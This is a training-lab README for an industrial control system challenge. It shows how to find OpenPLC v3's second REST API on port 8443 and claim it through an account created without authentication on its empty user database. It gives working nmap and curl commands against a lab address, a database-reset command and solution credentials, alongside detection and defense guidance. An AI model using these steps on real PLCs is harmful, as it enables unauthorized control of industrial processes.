# The Forgotten API

> **MITRE ATT&CK for ICS:** `Discovery` | [T0846.001 - Remote System Discovery: Port Scan](https://attack.mitre.org/techniques/T0846/001/) | `Initial Access`, `Lateral Movement` | [T0866 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T0866/) | `Persistence`, `Lateral Movement` | [T0859 - Valid Accounts](https://attack.mitre.org/techniques/T0859/) | `Discovery` | [T0888 - Remote System Information Discovery](https://attack.mitre.org/techniques/T0888/)

## Overview
Everybody who has worked through the
[Password Attack](../password_attack/README.md) and
[Credential Hardening](../defense_password/README.md) challenges knows the
OpenPLC web interface on **port 8080** and its login. Change its password and
the PLC's management is locked, or so it seems.

OpenPLC v3 has a **second management interface**. Next to the web interface
it runs a REST API over HTTPS on **port 8443**, meant for the OpenPLC Editor
and for automation scripts. It can start and stop the PLC, read the runtime
logs and upload a new PLC program. It has its **own user database**, separate
from the web interface's, and that database **ships empty**.

An empty user database is a "first run" state: the API lets the first caller
create an account without logging in, so that an owner can set it up. Nobody
in CybICS ever did. Whoever finds the port first becomes its owner.

Your goal is to **find the API, claim it with an account of your own, use it,
and give it back**.

## Background

### Setup mode as an attack surface

Many devices and services start in a setup mode: no users yet, so the first
visitor is allowed to create the administrator. That is fine on a workbench.
On a network it is a race, and the defender usually does not know there is a
race, because the interface is not the one they use every day. The weakness
has a name: **CWE-306, Missing Authentication for Critical Function**.

### OpenPLC's REST API

The code is in `software/OpenPLC/OpenPLC_v3/webserver/restapi.py`, the routes
under `/api` are:

| Route | Authentication | What it does |
|-------|----------------|--------------|
| `GET /api/get-users-info` | none while no user exists | "No users found" (404) or "Users found" (200); with a token the full user list |
| `POST /api/create-user` | **none while no user exists**, a token afterwards | creates a user; the caller chooses name, password and `role` |
| `POST /api/login` | user name and password | returns a JSON Web Token (`access_token`), valid for 15 minutes |
| `GET /api/ping`, `status`, `runtime-logs`, `compilation-status` | token | read the PLC's state and logs |
| `GET /api/start-plc`, `stop-plc` | token | start or stop the PLC runtime |
| `POST /api/upload-file` | token | replace the PLC program and compile it |
| `DELETE /api/delete-user/<id>` | token | delete a user |

The `role` field is stored, but nothing checks it: every account can do
everything in the table. The token goes in an `Authorization: Bearer <token>`
header.

Port 8443 on the PLC is **not** the IDS dashboard, which also uses 8443 but
on the host (`$DEVICE_IP`). The REST API is only reachable at the PLC's own
address, **172.18.0.3**, from inside the plant network.

## Where to run it

From the **attack shell** (WebShell view of the landing page, 172.18.0.100)
or the Kali attack machine. Both have `curl`, `nmap` and Python.

## Task

The flag has the format `CybICS(flag)`. It is revealed by **Verify** on the
challenge page when you enter the **user name and password of an account you
created on the REST API**. The check logs in with them on port 8443, reads
the user list and the PLC status with the token it gets, and passes when your
account is in that list. The password needs at least 8 characters. Use a
throwaway password: the answer field shows it in clear text.

Do **not** run `stop-plc` or `upload-file`: the plant is shared with everyone
else on the board. Reading is enough to prove the point.

### Steps

1. **Find the port.** Scan the PLC's TCP ports with service detection:
   ```bash
   nmap -sV -p 8000-9000 172.18.0.3
   ```
   Next to `8080` (the web interface) you see `8443/tcp open ssl/http Werkzeug`:
   a Python web application behind TLS.

2. **Ask it who it is.** The certificate is self-signed, so tell `curl` not
   to check it (`-k`):
   ```bash
   curl -sk https://172.18.0.3:8443/api/ping
   curl -sk https://172.18.0.3:8443/api/get-users-info
   ```
   `ping` wants a token (`Missing Authorization Header`), but the user list
   tells you something it should not: `No users found`.

3. **Try the web interface's login.** The 8080 login is `openplc`/`openplc`
   unless someone changed it. Does it work here?
   ```bash
   curl -sk -X POST https://172.18.0.3:8443/api/login \
        -H 'Content-Type: application/json' \
        -d '{"username":"openplc","password":"openplc"}'
   ```
   `Wrong username or password`: two interfaces, two user databases.

4. **Claim the API.** With no user in the table, `create-user` asks for no
   token. Choose a name and a password of at least 8 characters:
   ```bash
   curl -sk -X POST https://172.18.0.3:8443/api/create-user \
        -H 'Content-Type: application/json' \
        -d '{"username":"<your name>","password":"<your password>"}'
   ```
   `{"id": 1, "msg": "User created"}`: the API is yours. Note the `id`.
   If the answer is `User already created!`, someone was faster; see
   *Reset* below.

5. **Log in and use it.**
   ```bash
   TOKEN=$(curl -sk -X POST https://172.18.0.3:8443/api/login \
        -H 'Content-Type: application/json' \
        -d '{"username":"<your name>","password":"<your password>"}' \
        | python3 -c 'import json,sys; print(json.load(sys.stdin)["access_token"])')
   curl -sk -H "Authorization: Bearer $TOKEN" https://172.18.0.3:8443/api/status
   curl -sk -H "Authorization: Bearer $TOKEN" https://172.18.0.3:8443/api/get-users-info
   curl -sk -H "Authorization: Bearer $TOKEN" https://172.18.0.3:8443/api/runtime-logs | head -c 400
   ```
   `STATUS:RUNNING`, the full user list, the PLC runtime's log. The same token
   would be accepted by `stop-plc` and `upload-file`.

6. **Verify.** Enter the user name and password on the challenge page and
   click **Verify**.

7. **Give it back.** Delete your account, so the next student finds the API
   unclaimed (use the `id` from step 4):
   ```bash
   curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" \
        https://172.18.0.3:8443/api/delete-user/<id>
   curl -sk https://172.18.0.3:8443/api/get-users-info
   ```
   `No users found` again. The token is only valid for 15 minutes; if it has
   expired, repeat the login of step 5 first.

`openplc_restapi.py` in this directory does steps 2, 4, 5 and 7 with the
Python standard library (`python3 openplc_restapi.py --help`).

### Reset

The REST API's user database lives inside the OpenPLC container and survives
a restart of the container, but not its re-creation. If the API is claimed
and nobody knows the password, empty the user table from the landing page's
**admin shell** (WebShell view, *Admin shell*), which has Docker access:

```bash
docker exec "$(docker ps --filter name=openplc --format '{{.Names}}' | head -n1)" \
  python3 -c "import sqlite3; c = sqlite3.connect('/CybICS/OpenPLC_v3/webserver/instance/{DB_PATH}'); c.execute('DELETE FROM user'); c.commit()"
```

The file name `{DB_PATH}` with braces is real: a missing `f` before a string
in OpenPLC's `config.py` writes the placeholder literally.

## Detect and Defend

### Detection
- The CybICS IDS sees the **port scan** of step 1 (`port_scan`), but nothing
  after it. The API speaks TLS, so the IDS cannot read the requests, and no
  rule watches port 8443 on the PLC.
- OpenPLC logs every API request in its container log, with the source
  address: `docker logs <openplc container> 2>&1 | grep /api/`. A
  `POST /api/create-user ... 201` is the moment the API was claimed. In a plant
  that does not use the API at all, any line there is an incident.
- The API's user list itself is evidence: an account nobody on the team
  created.

### Defense
- **Claim it yourself.** If the interface is needed, create its first account
  during commissioning, with a strong password, before the device goes on the
  network. Setup mode must never reach production.
- **Turn it off or block it.** CybICS does not use the REST API. A service
  that is not needed should not run; if it cannot be switched off, a firewall
  rule on the PLC that drops port 8443 (as in
  [Modbus Firewall Rules](../defense_firewall/README.md) for port 502) or
  [Network Segmentation](../defense_network/README.md) keeps it out of reach.
  The [Close the Side Doors](../defense_unused_protocols/README.md) challenge
  blocks the API this way, together with the PLC's unused protocols.
- **Inventory every interface.** Hardening the web interface's password did
  nothing here. A full port scan of each device during commissioning, compared
  with the list of interfaces you intend to use, finds the forgotten ones.
- **Ask the vendor for authenticated setup.** A first-run account should need
  something only the owner has: a password printed on the device, a local
  console, a physical button.

## Security Framework References

<details>
  <summary>Click to expand</summary>

### MITRE ATT&CK for ICS

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Discovery | Remote System Discovery: Port Scan | [T0846.001](https://attack.mitre.org/techniques/T0846/001/) | The service scan finds the second management port on the PLC |
| Initial Access, Lateral Movement | Exploitation of Remote Services | [T0866](https://attack.mitre.org/techniques/T0866/) | A programming flaw (no authentication while the user table is empty, CWE-306) hands out an account on a remote service |
| Persistence, Lateral Movement | Valid Accounts | [T0859](https://attack.mitre.org/techniques/T0859/) | The created account is a legitimate login that stays until someone deletes it |
| Discovery | Remote System Information Discovery | [T0888](https://attack.mitre.org/techniques/T0888/) | The authenticated API returns the PLC's run state, its runtime log and the user list |

### MITRE D3FEND - Defensive Countermeasures

| Technique | ID | Description |
|-----------|-----|-------------|
| Inbound Traffic Filtering | [D3-ITF](https://d3fend.mitre.org/technique/d3f:InboundTrafficFiltering/) | Drop port 8443 on the PLC where the API is not used |
| Application Configuration Hardening | [D3-ACH](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening/) | Create the API's first account during commissioning, or disable the API |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **Configuration Management (CM)** | CM-7, CM-8 | Least functionality: disable unused services; a component inventory that includes every interface |
| **Identification and Authentication (IA)** | IA-2, IA-5 | Every management function needs an authenticated user; initial authenticators are set by the owner |
| **System and Communications Protection (SC)** | SC-7 | Boundary protection around management interfaces |

</details>

## Hints

<details>
  <summary>💡 Hint</summary>

The PLC has more than one web server. Scan beyond the well-known ports, and
when you find one that speaks HTTPS, ask it how many users it has.

</details>

## Solution

<details>
  <summary>Click to expand</summary>

From the attack shell:

```bash
cd /CybICS/training/openplc_restapi
python3 openplc_restapi.py probe
python3 openplc_restapi.py claim --user student --password 'training-only-42'
```

Enter `student` and `training-only-42` on the challenge page and click
**Verify**, then give the API back:

```bash
python3 openplc_restapi.py release --user student --password 'training-only-42'
```

</details>
